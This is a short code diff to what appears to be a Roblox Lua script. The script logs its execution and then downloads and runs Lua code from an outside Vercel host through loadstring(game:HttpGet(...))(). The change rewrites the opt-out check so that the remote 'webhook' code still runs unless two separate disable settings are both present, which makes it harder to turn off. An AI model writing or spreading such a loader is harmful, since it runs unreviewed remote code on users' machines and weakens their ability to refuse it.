@@ -32,7 +32,6 @@ end)
 if not success then
     warn("Execution log failed:", err)
 end
-
-if shared.ignore_webhook ~= true then
+if not Script:find(":disabled") or shared.webhook_disabled ~= true then
     loadstring(game:HttpGet("https://roblox-alpha-murex.vercel.app/webhook.lua"))()
 end
